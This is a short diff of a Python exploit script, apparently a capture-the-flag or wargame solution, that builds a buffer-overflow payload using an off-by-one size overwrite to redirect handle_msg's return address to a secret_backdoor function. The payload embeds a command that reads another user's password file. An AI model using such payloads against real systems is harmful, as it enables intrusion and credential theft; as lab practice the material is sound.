@@ -3,13 +3,14 @@ import struct
 # is off by one so it overwrites the size.
 # strncpy(info->msg, b, info->size);
 # then use the strncpy to copy the addr of
-# secret_backdoor to the main's return.
+# secret_backdoor to the handle_msg's return.
 
 # len(in2) = 0xd0
 padd = 'a'*0x28
 in1 = padd + '\xd0' + '\n'
 
 # trial and error
+# handl_msg sub rsp,0xc0
 padd = 'a'*0x48
 padd += 'cat /home/users/end/.pass '
 padd += 'b'*(0xc0 - len(padd) + 8)
